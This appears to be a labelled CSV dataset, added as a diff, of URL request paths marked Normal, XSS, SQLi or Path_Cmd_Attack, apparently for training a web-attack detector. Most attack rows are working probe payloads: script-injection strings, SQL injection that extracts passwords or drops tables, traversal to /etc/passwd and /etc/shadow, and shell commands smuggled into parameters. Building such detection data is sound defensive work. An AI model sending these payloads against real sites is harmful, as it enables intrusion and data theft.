@@ -1,0 +1,980 @@
+payload,label
+/products?q=order+status+and+tracking+id+15&page=10&lang=fr,Normal
+/assets/img/bundle_26.min.js?v=4.3,Normal
+/index.html?name=<script>alert(829)</script>,XSS
+/cart/view?comment=%3Csvg/onload%3Dalert%28%27XSS_299%27%29%3E,XSS
+/render?path=..\..\..\windows\win.ini&v=71,Path_Cmd_Attack
+/search?user=729%22%20OR%20%221%22%3D%221%22--,SQLi
+"/user/profile?item_id=1871' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>90--",SQLi
+"/blog/post?search="";alert(String.fromCharCode(88,83,83,691))//",XSS
+"/news/article?article_id=8311' UNION ALL SELECT NULL,version(),database()#",SQLi
+/diag?doc=$(whoami)&v=130,Path_Cmd_Attack
+"/api/v1/items?q='><iframe src=""javascript:alert(876)""></iframe>",XSS
+/blog/post?search=<img src=x onerror=alert(986)>,XSS
+/ping?cmd=localhost && ls -la /home&v=163,Path_Cmd_Attack
+/checkout?cat=452' OR EXISTS(SELECT * FROM admins WHERE id=87)--,SQLi
+/diag?path=$(whoami)&v=60,Path_Cmd_Attack
+/search?redirect=javascript%3Aalert%28document.domain%29,XSS
+/checkout?id=94693&cat=clothing&sort=popular,Normal
+/ping?template=/var/www/html/../../etc/hosts&v=43,Path_Cmd_Attack
+/api/v1/items?uid=7751' RLIKE (SELECT (CASE WHEN (62=62) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+"/products?q=""><script>alert(document.cookie)</script>",XSS
+/checkout?q=ping+test+speed+for+gaming+router+58&page=9&lang=en,Normal
+/blog/2026/select-best-monitor-for-gaming-and-office-189?ref=nav_6,Normal
+/ping?template=127.0.0.1%3B%20cat%20/etc/passwd&v=140,Path_Cmd_Attack
+/checkout?q=drop+shipping+guide+for+beginners+50&page=16&lang=en,Normal
+/blog/2026/web-development-course-132?ref=nav_2,Normal
+/products?callback=javascript:alert(document.domain),XSS
+/search?redirect=%3Csvg/onload%3Dalert%28%27XSS_507%27%29%3E,XSS
+/export?doc=10.0.0.743; ping -c 4 127.0.0.1&v=137,Path_Cmd_Attack
+/news/article?q=iframe+responsive+css+tutorial+77&page=2&lang=fr,Normal
+/support/ticket?q=windows+11+installation+guide+85&page=19&lang=ar,Normal
+/checkout?id=86871&cat=software&sort=rating,Normal
+/checkout?name=%3Csvg/onload%3Dalert%28%27XSS_858%27%29%3E,XSS
+/blog/2023/how-to-prevent-sql-injection-and-xss-37?ref=nav_17,Normal
+/products?order_id=8331' ORDER BY 83--,SQLi
+/export?dir=8.8.8.8%20%7C%20whoami&v=181,Path_Cmd_Attack
+/courses/view?redirect=<input autofocus onfocus=alert(document.cookie)>,XSS
+/news/article?id=88339&cat=books&sort=newest,Normal
+/api/v1/items?item_id=71' RLIKE (SELECT (CASE WHEN (42=42) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/search?file=file_934.txt%3B%20id%3B%20uname%20-a&v=9,Path_Cmd_Attack
+/blog/post?q=select+best+monitor+for+gaming+and+office+1&page=16&lang=fr,Normal
+/view?page=`cat /etc/issue`&v=200,Path_Cmd_Attack
+/api/v2/users/4575/orders?status=pending&limit=50,Normal
+"/api/v1/items?title=<a href=""javascript:confirm(182)"">click_182</a>",XSS
+"/search?q=3271' UNION ALL SELECT NULL,version(),database()#",SQLi
+/search?page=file_805.txt; id; uname -a&v=39,Path_Cmd_Attack
+"/products?comment=<a href=""javascript:confirm(250)"">click_250</a>",XSS
+/blog/2026/ping-test-speed-for-gaming-router-217?ref=nav_18,Normal
+/support/ticket?user=429' AND SLEEP(3)--,SQLi
+/courses/view?id=6631&cat=cloud&sort=price_asc,Normal
+/api/v1/items?uid=627' AND SLEEP(53)--,SQLi
+/search?path=%24%28whoami%29&v=209,Path_Cmd_Attack
+"/checkout?id=7411' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>87--",SQLi
+/blog/2023/order-status-and-tracking-id-297?ref=nav_20,Normal
+/view?doc=../../../../etc/passwd&v=151,Path_Cmd_Attack
+/news/article?item_id=996' HAVING 1=1--,SQLi
+/view?file=../../../etc/shadow&v=218,Path_Cmd_Attack
+/assets/css/bundle_9.min.js?v=1.1,Normal
+/export?ip=`cat /etc/issue`&v=59,Path_Cmd_Attack
+/download?ip=localhost%20%26%26%20ls%20-la%20/home&v=58,Path_Cmd_Attack
+/view?ip=../../../../proc/self/environ&v=8,Path_Cmd_Attack
+/api/v2/users/6632/orders?status=paid&limit=50,Normal
+/api/v2/users/2011/orders?status=pending&limit=10,Normal
+/export?dir=../../../../proc/self/environ&v=195,Path_Cmd_Attack
+/courses/view?redirect=%3Ca%20href%3D%22javascript%3Aconfirm%28918%29%22%3Eclick_918%3C/a%3E,XSS
+/user/profile?search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/checkout?article_id=3851' AND (SELECT COUNT(*) FROM information_schema.tables)>46--,SQLi
+"/checkout?q=1871' UNION ALL SELECT NULL,version(),database()#",SQLi
+/assets/img/bundle_1.min.js?v=6.7,Normal
+/products?callback=<script>alert(128)</script>,XSS
+/export?doc=127.0.0.1; cat /etc/passwd&v=191,Path_Cmd_Attack
+/user/profile?user=8731%27%20ORDER%20BY%2037--,SQLi
+/products?q=order+status+and+tracking+id+76&page=13&lang=fr,Normal
+/user/profile?msg=<script>alert(764)</script>,XSS
+/blog/post?title=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+"/news/article?item_id=6931' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>6--",SQLi
+/user/profile?q=1581%27%20ORDER%20BY%2073--,SQLi
+/export?host=10.0.0.324; ping -c 4 127.0.0.1&v=185,Path_Cmd_Attack
+/courses/view?id=14664&cat=books&sort=price_desc,Normal
+/assets/js/bundle_32.min.js?v=8.2,Normal
+/download?page=..\..\..\windows\win.ini&v=78,Path_Cmd_Attack
+/export?ip=%24%28whoami%29&v=96,Path_Cmd_Attack
+/forum/thread?q=web+development+course+61&page=9&lang=ar,Normal
+/blog/2024/alert-system-for-smart-home-security-150?ref=nav_1,Normal
+/courses/view?q=windows+11+installation+guide+57&page=23&lang=ar,Normal
+/blog/post?comment=<script>alert(327)</script>,XSS
+/index.html?id=43714&cat=software&sort=price_desc,Normal
+/assets/js/bundle_61.min.js?v=5.3,Normal
+/blog/2025/etc-group-study-materials-54?ref=nav_16,Normal
+"/forum/thread?item_id=712' UNION/**/SELECT/**/table_name,NULL/**/FROM/**/information_schema.tables--",SQLi
+/cart/view?q=union+bank+branch+locations+near+me+49&page=18&lang=fr,Normal
+/view?doc=/var/www/html/../../etc/hosts&v=0,Path_Cmd_Attack
+"/support/ticket?name=""><script>alert(document.cookie)</script>",XSS
+/courses/view?q=sleep+tracker+smartwatch+review+65&page=20&lang=ar,Normal
+/news/article?item_id=5781%27%20ORDER%20BY%2010--,SQLi
+/download?file=../../../etc/shadow&v=103,Path_Cmd_Attack
+/search?template=../../../etc/shadow&v=176,Path_Cmd_Attack
+/news/article?comment=<details open ontoggle=alert(360)>,XSS
+/user/profile?order_id=655' AND SLEEP(23)--,SQLi
+/search?page=..\..\..\windows\win.ini&v=112,Path_Cmd_Attack
+/forum/thread?item_id=1451' WAITFOR DELAY '0:0:11'--,SQLi
+/blog/post?q=drop+shipping+guide+for+beginners+92&page=11&lang=en,Normal
+/assets/css/bundle_72.min.js?v=1.5,Normal
+/index.html?msg=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C225%29%29//,XSS
+"/search?order_id=666"" OR ""1""=""1""--",SQLi
+/index.html?id=47577&cat=security&sort=price_desc,Normal
+/support/ticket?id=50141&cat=electronics&sort=popular,Normal
+/diag?template=%24%28whoami%29&v=174,Path_Cmd_Attack
+/blog/2026/how-to-learn-python-108?ref=nav_4,Normal
+/news/article?q=528%27%20AND%20SLEEP%2898%29--,SQLi
+/checkout?q=sleep+tracker+smartwatch+review+73&page=20&lang=fr,Normal
+/support/ticket?q=shadow+of+the+tomb+raider+review+2&page=22&lang=fr,Normal
+/assets/img/bundle_51.min.js?v=3.5,Normal
+/cart/view?q=order+status+and+tracking+id+33&page=3&lang=ar,Normal
+/forum/thread?q=shadow+of+the+tomb+raider+review+63&page=21&lang=en,Normal
+/assets/js/bundle_89.min.js?v=9.6,Normal
+/assets/css/bundle_34.min.js?v=6.1,Normal
+/user/profile?cat=577' OR EXISTS(SELECT * FROM admins WHERE id=41)--,SQLi
+/export?path=localhost && ls -la /home&v=85,Path_Cmd_Attack
+/ping?doc=/var/www/html/../../etc/hosts&v=147,Path_Cmd_Attack
+/download?page=10.0.0.551; ping -c 4 127.0.0.1&v=156,Path_Cmd_Attack
+/cart/view?callback=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+/blog/2025/order-status-and-tracking-id-228?ref=nav_9,Normal
+/download?path=../../../../etc/passwd&v=192,Path_Cmd_Attack
+/support/ticket?q=windows+11+installation+guide+71&page=1&lang=fr,Normal
+/blog/2021/union-bank-branch-locations-near-me-315?ref=nav_4,Normal
+/api/v2/users/2188/orders?status=pending&limit=20,Normal
+/index.html?q=ping+test+speed+for+gaming+router+79&page=25&lang=en,Normal
+/search?ip=/var/www/html/../../etc/hosts&v=127,Path_Cmd_Attack
+/courses/view?cat=3411' RLIKE (SELECT (CASE WHEN (27=27) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/blog/2021/ping-test-speed-for-gaming-router-285?ref=nav_4,Normal
+"/checkout?article_id=860-1 UNION SELECT 1,username,password FROM users--",SQLi
+/render?file=../../../../etc/passwd&v=55,Path_Cmd_Attack
+"/blog/post?search=""><script>alert(document.cookie)</script>",XSS
+/render?host=%24%28whoami%29&v=133,Path_Cmd_Attack
+/api/v2/users/815/orders?status=paid&limit=50,Normal
+/products?article_id=115' OR EXISTS(SELECT * FROM admins WHERE id=10)--,SQLi
+/diag?host=/var/www/html/../../etc/hosts&v=65,Path_Cmd_Attack
+/products?q=iframe+responsive+css+tutorial+92&page=11&lang=en,Normal
+/blog/post?article_id=9331%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/view?path=file_341.txt; id; uname -a&v=36,Path_Cmd_Attack
+/search?cmd=....//....//....//etc/passwd&v=76,Path_Cmd_Attack
+/ping?path=file_66.txt%3B%20id%3B%20uname%20-a&v=16,Path_Cmd_Attack
+/support/ticket?comment=%3Cbody%20onload%3Dprompt%28320%29%3E,XSS
+/ping?dir=10.0.0.137%3B%20ping%20-c%204%20127.0.0.1&v=115,Path_Cmd_Attack
+/ping?ip=localhost%20%26%26%20ls%20-la%20/home&v=11,Path_Cmd_Attack
+/courses/view?q=web+development+course+31&page=24&lang=ar,Normal
+/products?user=6481' RLIKE (SELECT (CASE WHEN (77=77) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/search?page=....//....//....//etc/passwd&v=201,Path_Cmd_Attack
+/user/profile?id=57712&cat=books&sort=rating,Normal
+/index.html?msg=javascript%3Aalert%28document.domain%29,XSS
+/products?q=update+my+account+settings+and+password+53&page=16&lang=ar,Normal
+/api/v1/items?redirect=<svg/onload=alert('XSS_659')>,XSS
+/support/ticket?callback=%3Cbody%20onload%3Dprompt%2869%29%3E,XSS
+/view?host=/var/www/html/../../etc/hosts&v=175,Path_Cmd_Attack
+/cart/view?article_id=2591%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/blog/post?q=select+best+monitor+for+gaming+and+office+99&page=13&lang=fr,Normal
+/courses/view?user=2741' WAITFOR DELAY '0:0:31'--,SQLi
+/news/article?id=50433&cat=networking&sort=rating,Normal
+/support/ticket?id=57177&cat=electronics&sort=popular,Normal
+/forum/thread?title=<input autofocus onfocus=alert(document.cookie)>,XSS
+/forum/thread?q=script+writing+tips+for+youtube+26&page=5&lang=en,Normal
+"/index.html?redirect=""><script>alert(document.cookie)</script>",XSS
+/blog/2024/alert-system-for-smart-home-security-72?ref=nav_16,Normal
+/user/profile?q=sleep+tracker+smartwatch+review+35&page=10&lang=ar,Normal
+/forum/thread?cat=571%27%20HAVING%201%3D1--,SQLi
+/search?template=127.0.0.1; cat /etc/passwd&v=171,Path_Cmd_Attack
+/courses/view?q=where+to+buy+table+lamps+from+ikea+59&page=12&lang=fr,Normal
+/search?q=%3Cdetails%20open%20ontoggle%3Dalert%28373%29%3E,XSS
+/render?doc=/var/www/html/../../etc/hosts&v=44,Path_Cmd_Attack
+/api/v2/users/9077/orders?status=pending&limit=20,Normal
+/blog/2022/best-laptops-2026-236?ref=nav_15,Normal
+/assets/css/bundle_22.min.js?v=4.1,Normal
+/blog/2020/how-to-prevent-sql-injection-and-xss-310?ref=nav_14,Normal
+/render?template=/var/www/html/../../etc/hosts&v=129,Path_Cmd_Attack
+/courses/view?q=update+my+account+settings+and+password+15&page=22&lang=en,Normal
+/user/profile?id=2001' ORDER BY 7--,SQLi
+"/index.html?comment=""><script>alert(document.cookie)</script>",XSS
+/user/profile?search=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+/search?ip=file_565.txt%3B%20id%3B%20uname%20-a&v=189,Path_Cmd_Attack
+/diag?file=..\..\..\windows\win.ini&v=82,Path_Cmd_Attack
+/support/ticket?q=etc+group+study+materials+17&page=7&lang=ar,Normal
+/user/profile?comment=%3Cdetails%20open%20ontoggle%3Dalert%2846%29%3E,XSS
+/blog/2025/union-bank-branch-locations-near-me-163?ref=nav_16,Normal
+/view?file=8.8.8.8 | whoami&v=186,Path_Cmd_Attack
+/search?comment=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C112%29%29//,XSS
+/cart/view?callback=<details open ontoggle=alert(917)>,XSS
+/support/ticket?title=javascript%3Aalert%28document.domain%29,XSS
+/api/v1/items?id=7671%27%20ORDER%20BY%2064--,SQLi
+/download?template=file_933.txt%3B%20id%3B%20uname%20-a&v=64,Path_Cmd_Attack
+/api/v2/users/1369/orders?status=shipped&limit=20,Normal
+/api/v2/users/6186/orders?status=pending&limit=50,Normal
+/diag?cmd=../../../../proc/self/environ&v=169,Path_Cmd_Attack
+/render?cmd=..\..\..\windows\win.ini&v=104,Path_Cmd_Attack
+/blog/2022/order-status-and-tracking-id-308?ref=nav_4,Normal
+/search?article_id=869%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/api/v1/items?cat=5871%27%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284%3D4%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29--,SQLi
+/export?template=../../../../etc/passwd&v=95,Path_Cmd_Attack
+/news/article?search=javascript:alert(document.domain),XSS
+/forum/thread?id=6581' RLIKE (SELECT (CASE WHEN (81=81) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/api/v2/users/506/orders?status=pending&limit=50,Normal
+/products?q=update+my+account+settings+and+password+75&page=9&lang=en,Normal
+/index.html?user=688' AND SLEEP(98)--,SQLi
+/api/v2/users/5659/orders?status=pending&limit=10,Normal
+"/courses/view?cat=6301' UNION ALL SELECT NULL,version(),database()#",SQLi
+/cart/view?q=javascript:alert(document.domain),XSS
+/blog/2025/where-to-buy-table-lamps-from-ikea-125?ref=nav_6,Normal
+/search?ip=%24%28whoami%29&v=102,Path_Cmd_Attack
+/products?q=3981%27%20ORDER%20BY%202--,SQLi
+/blog/2024/sleep-tracker-smartwatch-review-75?ref=nav_14,Normal
+/blog/2025/sleep-tracker-smartwatch-review-143?ref=nav_5,Normal
+/ping?dir=10.0.0.494; ping -c 4 127.0.0.1&v=211,Path_Cmd_Attack
+/news/article?search=<body onload=prompt(361)>,XSS
+/blog/post?id=74178&cat=electronics&sort=rating,Normal
+/support/ticket?callback=<body onload=prompt(276)>,XSS
+/checkout?order_id=6901%27%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%283%3D3%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29--,SQLi
+/checkout?callback=%3Cscript%3Ealert%28177%29%3C/script%3E,XSS
+/forum/thread?comment=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C265%29%29//,XSS
+/user/profile?q=<script>alert(152)</script>,XSS
+/cart/view?item_id=7901; DROP TABLE users--,SQLi
+/index.html?uid=593admin'--,SQLi
+/user/profile?order_id=5031' RLIKE (SELECT (CASE WHEN (93=93) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/api/v1/items?q=sleep+tracker+smartwatch+review+32&page=3&lang=ar,Normal
+/blog/post?search=%3Cdetails%20open%20ontoggle%3Dalert%28865%29%3E,XSS
+/user/profile?uid=9801' ORDER BY 96--,SQLi
+/support/ticket?search=%3Csvg/onload%3Dalert%28%27XSS_138%27%29%3E,XSS
+/index.html?comment=%3Ca%20href%3D%22javascript%3Aconfirm%28684%29%22%3Eclick_684%3C/a%3E,XSS
+/export?template=127.0.0.1; cat /etc/passwd&v=116,Path_Cmd_Attack
+/blog/post?title=%27%3E%3Ciframe%20src%3D%22javascript%3Aalert%28271%29%22%3E%3C/iframe%3E,XSS
+/blog/2023/alert-system-for-smart-home-security-201?ref=nav_16,Normal
+/api/v2/users/8131/orders?status=pending&limit=20,Normal
+/search?user=531%27%20OR%201%3D1--,SQLi
+/blog/2023/script-writing-tips-for-youtube-59?ref=nav_4,Normal
+/export?dir=$(whoami)&v=149,Path_Cmd_Attack
+"/index.html?redirect=<a href=""javascript:confirm(368)"">click_368</a>",XSS
+/user/profile?title=<img src=x onerror=alert(652)>,XSS
+/news/article?id=36343&cat=clothing&sort=price_desc,Normal
+/user/profile?user=165-1%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--,SQLi
+/api/v1/items?redirect=javascript:alert(document.domain),XSS
+/diag?path=localhost && ls -la /home&v=152,Path_Cmd_Attack
+/cart/view?redirect=%3Ca%20href%3D%22javascript%3Aconfirm%28412%29%22%3Eclick_412%3C/a%3E,XSS
+/assets/js/bundle_99.min.js?v=4.4,Normal
+/blog/post?q=select+best+monitor+for+gaming+and+office+74&page=17&lang=en,Normal
+/support/ticket?name=%3Cscr%3Cscript%3Eipt%3Ealert%28289%29%3C/scr%3C/script%3Eipt%3E,XSS
+/index.html?user=4881%27%20ORDER%20BY%2049--,SQLi
+/search?comment=<script>alert(955)</script>,XSS
+/search?doc=....//....//....//etc/passwd&v=106,Path_Cmd_Attack
+/search?id=86512&cat=software&sort=popular,Normal
+"/user/profile?order_id=783"" OR ""1""=""1""--",SQLi
+/checkout?order_id=9901' ORDER BY 65--,SQLi
+/index.html?id=20034&cat=clothing&sort=popular,Normal
+/search?dir=/var/www/html/../../etc/hosts&v=135,Path_Cmd_Attack
+/download?path=../../../etc/shadow&v=69,Path_Cmd_Attack
+/search?q=where+to+buy+table+lamps+from+ikea+17&page=22&lang=fr,Normal
+/user/profile?q=union+bank+branch+locations+near+me+66&page=16&lang=en,Normal
+/export?dir=../../../etc/shadow&v=35,Path_Cmd_Attack
+/api/v2/users/5183/orders?status=shipped&limit=20,Normal
+/support/ticket?q=5281' ORDER BY 17--,SQLi
+/index.html?title=<input autofocus onfocus=alert(document.cookie)>,XSS
+/user/profile?q=ping+test+speed+for+gaming+router+9&page=3&lang=en,Normal
+/diag?dir=../../../etc/shadow&v=4,Path_Cmd_Attack
+/download?cmd=10.0.0.605%3B%20ping%20-c%204%20127.0.0.1&v=193,Path_Cmd_Attack
+/search?redirect=<details open ontoggle=alert(146)>,XSS
+/search?callback=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C440%29%29//,XSS
+/ping?page=..\..\..\windows\win.ini&v=45,Path_Cmd_Attack
+"/news/article?id=8941' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--",SQLi
+/api/v2/users/1218/orders?status=paid&limit=20,Normal
+/export?page=....//....//....//etc/passwd&v=111,Path_Cmd_Attack
+/api/v1/items?q=6321%27%20WAITFOR%20DELAY%20%270%3A0%3A21%27--,SQLi
+"/search?order_id=5761' UNION ALL SELECT NULL,version(),database()#",SQLi
+/view?template=../../../../etc/passwd&v=219,Path_Cmd_Attack
+/forum/thread?id=23219&cat=databases&sort=popular,Normal
+/assets/css/bundle_88.min.js?v=2.4,Normal
+/support/ticket?callback=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+/blog/2020/alert-system-for-smart-home-security-289?ref=nav_6,Normal
+/assets/js/bundle_122.min.js?v=8.7,Normal
+"/courses/view?title="";alert(String.fromCharCode(88,83,83,239))//",XSS
+/cart/view?q=drop+shipping+guide+for+beginners+59&page=11&lang=ar,Normal
+/news/article?id=6896&cat=clothing&sort=price_desc,Normal
+"/courses/view?q=<a href=""javascript:confirm(452)"">click_452</a>",XSS
+/courses/view?q=iframe+responsive+css+tutorial+55&page=19&lang=ar,Normal
+/blog/post?id=2131%3B%20DROP%20TABLE%20users--,SQLi
+"/search?callback=""><script>alert(document.cookie)</script>",XSS
+/view?path=8.8.8.8 | whoami&v=52,Path_Cmd_Attack
+"/courses/view?order_id=441"" OR ""1""=""1""--",SQLi
+"/cart/view?uid=896"" OR ""1""=""1""--",SQLi
+/api/v2/users/9531/orders?status=pending&limit=50,Normal
+/forum/thread?q=904%27%20UNION/%2A%2A/SELECT/%2A%2A/table_name%2CNULL/%2A%2A/FROM/%2A%2A/information_schema.tables--,SQLi
+/checkout?uid=3551%27%20ORDER%20BY%2030--,SQLi
+/forum/thread?search=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C601%29%29//,XSS
+/cart/view?q=%3Cscr%3Cscript%3Eipt%3Ealert%28307%29%3C/scr%3C/script%3Eipt%3E,XSS
+/forum/thread?cat=735' OR 'a'='a,SQLi
+/api/v1/items?callback=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,XSS
+/download?path=`cat /etc/issue`&v=66,Path_Cmd_Attack
+/products?id=82579&cat=mobile&sort=price_desc,Normal
+/user/profile?uid=971admin'--,SQLi
+/user/profile?q=drop+shipping+guide+for+beginners+86&page=23&lang=ar,Normal
+/courses/view?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28381%29%3E,XSS
+/api/v2/users/945/orders?status=pending&limit=20,Normal
+/user/profile?uid=1531' WAITFOR DELAY '0:0:90'--,SQLi
+/ping?page=file_514.txt; id; uname -a&v=197,Path_Cmd_Attack
+"/support/ticket?q='><iframe src=""javascript:alert(966)""></iframe>",XSS
+/courses/view?order_id=980%22%20OR%20%221%22%3D%221%22--,SQLi
+/products?q=order+status+and+tracking+id+41&page=22&lang=ar,Normal
+"/news/article?comment=""><script>alert(document.cookie)</script>",XSS
+/export?doc=10.0.0.270; ping -c 4 127.0.0.1&v=62,Path_Cmd_Attack
+/courses/view?order_id=691' OR 1=1--,SQLi
+/courses/view?callback=%3Cscript%3Ealert%2890%29%3C/script%3E,XSS
+/view?ip=localhost && ls -la /home&v=29,Path_Cmd_Attack
+/index.html?q=web+development+course+5&page=11&lang=en,Normal
+/api/v2/users/9866/orders?status=shipped&limit=10,Normal
+/export?path=127.0.0.1; cat /etc/passwd&v=167,Path_Cmd_Attack
+"/support/ticket?search=""><script>alert(document.cookie)</script>",XSS
+/api/v2/users/8217/orders?status=paid&limit=50,Normal
+/support/ticket?redirect=%3Csvg/onload%3Dalert%28%27XSS_330%27%29%3E,XSS
+/download?dir=../../../../proc/self/environ&v=216,Path_Cmd_Attack
+/api/v1/items?comment=%3Csvg/onload%3Dalert%28%27XSS_834%27%29%3E,XSS
+/api/v1/items?title=%3Ca%20href%3D%22javascript%3Aconfirm%28300%29%22%3Eclick_300%3C/a%3E,XSS
+/export?path=127.0.0.1; cat /etc/passwd&v=168,Path_Cmd_Attack
+/blog/2023/union-bank-branch-locations-near-me-252?ref=nav_4,Normal
+/view?path=10.0.0.504%3B%20ping%20-c%204%20127.0.0.1&v=89,Path_Cmd_Attack
+/index.html?name=%3Cscript%3Ealert%28327%29%3C/script%3E,XSS
+/blog/2025/best-laptops-2026-46?ref=nav_4,Normal
+/api/v1/items?name=javascript:alert(document.domain),XSS
+/view?template=file_873.txt; id; uname -a&v=88,Path_Cmd_Attack
+/download?template=127.0.0.1; cat /etc/passwd&v=194,Path_Cmd_Attack
+/blog/post?id=110' OR 1=1--,SQLi
+/support/ticket?comment=<svg/onload=alert('XSS_150')>,XSS
+/cart/view?q=shadow+of+the+tomb+raider+review+84&page=9&lang=fr,Normal
+/products?q=%3Csvg/onload%3Dalert%28%27XSS_489%27%29%3E,XSS
+/api/v1/items?callback=<details open ontoggle=alert(322)>,XSS
+/view?host=../../../../proc/self/environ&v=28,Path_Cmd_Attack
+/forum/thread?title=<img src=x onerror=alert(663)>,XSS
+/assets/css/bundle_142.min.js?v=1.1,Normal
+"/user/profile?redirect=<a href=""javascript:confirm(852)"">click_852</a>",XSS
+/search?ip=../../../../etc/passwd&v=141,Path_Cmd_Attack
+/search?template=../../../etc/shadow&v=26,Path_Cmd_Attack
+/checkout?item_id=9281' RLIKE (SELECT (CASE WHEN (58=58) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/forum/thread?order_id=633' AND SLEEP(99)--,SQLi
+/assets/css/bundle_145.min.js?v=6.5,Normal
+/forum/thread?article_id=4711' ORDER BY 41--,SQLi
+/ping?ip=`cat /etc/issue`&v=30,Path_Cmd_Attack
+/support/ticket?q=483' HAVING 1=1--,SQLi
+/download?doc=127.0.0.1; cat /etc/passwd&v=125,Path_Cmd_Attack
+/checkout?item_id=397' OR EXISTS(SELECT * FROM admins WHERE id=48)--,SQLi
+/assets/js/bundle_81.min.js?v=1.0,Normal
+"/user/profile?comment=<a href=""javascript:confirm(992)"">click_992</a>",XSS
+/news/article?q=972%27%20OR%20%27a%27%3D%27a,SQLi
+/ping?cmd=localhost && ls -la /home&v=22,Path_Cmd_Attack
+/assets/img/bundle_109.min.js?v=4.8,Normal
+/forum/thread?article_id=79' OR EXISTS(SELECT * FROM admins WHERE id=48)--,SQLi
+"/blog/post?comment='><iframe src=""javascript:alert(793)""></iframe>",XSS
+/products?search=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+/api/v1/items?id=16541&cat=security&sort=rating,Normal
+/blog/post?order_id=172admin%27--,SQLi
+/api/v1/items?article_id=755admin%27--,SQLi
+/api/v1/items?search=%3Cinput%20autofocus%20onfocus%3Dalert%28document.cookie%29%3E,XSS
+/user/profile?callback=javascript%3Aalert%28document.domain%29,XSS
+"/api/v1/items?comment=""><script>alert(document.cookie)</script>",XSS
+/search?q=update+my+account+settings+and+password+10&page=17&lang=fr,Normal
+/cart/view?redirect=%3Cimg%20src%3Dx%20onerror%3Dalert%28363%29%3E,XSS
+/index.html?callback=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C171%29%29//,XSS
+/render?ip=/var/www/html/../../etc/hosts&v=18,Path_Cmd_Attack
+/blog/2023/etc-group-study-materials-216?ref=nav_11,Normal
+"/search?id=2401' UNION ALL SELECT NULL,version(),database()#",SQLi
+/search?page=10.0.0.527%3B%20ping%20-c%204%20127.0.0.1&v=199,Path_Cmd_Attack
+/api/v2/users/8370/orders?status=paid&limit=50,Normal
+/export?dir=....//....//....//etc/passwd&v=99,Path_Cmd_Attack
+/user/profile?order_id=710' OR 1=1--,SQLi
+/user/profile?id=71' RLIKE (SELECT (CASE WHEN (85=85) THEN 0x61646d696e ELSE 0x28 END))--,SQLi
+/cart/view?q=3771; DROP TABLE users--,SQLi
+/api/v2/users/4165/orders?status=paid&limit=10,Normal
+/blog/2020/how-to-learn-python-127?ref=nav_14,Normal
+/search?user=4671%27%20UNION%20ALL%20SELECT%20NULL%2Cversion%28%29%2Cdatabase%28%29%23,SQLi
+/search?redirect=%3Cdetails%20open%20ontoggle%3Dalert%28985%29%3E,XSS
+/api/v2/users/9290/orders?status=shipped&limit=50,Normal
+/render?page=../../../../etc/passwd&v=160,Path_Cmd_Attack
+/blog/2022/order-status-and-tracking-id-96?ref=nav_13,Normal
+/view?doc=....//....//....//etc/passwd&v=51,Path_Cmd_Attack
+/diag?cmd=localhost && ls -la /home&v=132,Path_Cmd_Attack
+/search?q=shadow+of+the+tomb+raider+review+78&page=1&lang=fr,Normal
+/support/ticket?q=web+development+course+54&page=14&lang=ar,Normal
+/export?doc=../../../../proc/self/environ&v=84,Path_Cmd_Attack
+/search?order_id=81' OR EXISTS(SELECT * FROM admins WHERE id=35)--,SQLi
+/forum/thread?comment=<body onload=prompt(26)>,XSS
+"/index.html?order_id=1051' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>47--",SQLi
+/diag?host=10.0.0.193%3B%20ping%20-c%204%20127.0.0.1&v=49,Path_Cmd_Attack
+/checkout?msg=%3Cdetails%20open%20ontoggle%3Dalert%28307%29%3E,XSS
+/products?msg=%3Cscr%3Cscript%3Eipt%3Ealert%28247%29%3C/scr%3C/script%3Eipt%3E,XSS
+/blog/2023/etc-group-study-materials-251?ref=nav_19,Normal
+/diag?dir=10.0.0.587; ping -c 4 127.0.0.1&v=92,Path_Cmd_Attack
+/news/article?redirect=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C34%29%29//,XSS
+/checkout?comment=%3Cbody%20onload%3Dprompt%28764%29%3E,XSS
+/search?name=%22%3Balert%28String.fromCharCode%2888%2C83%2C83%2C804%29%29//,XSS
+/render?path=127.0.0.1; cat /etc/passwd&v=190,Path_Cmd_Attack
+/search?q=windows+11+installation+guide+90&page=15&lang=en,Normal
+/courses/view?q=739' OR EXISTS(SELECT * FROM admins WHERE id=87)--,SQLi
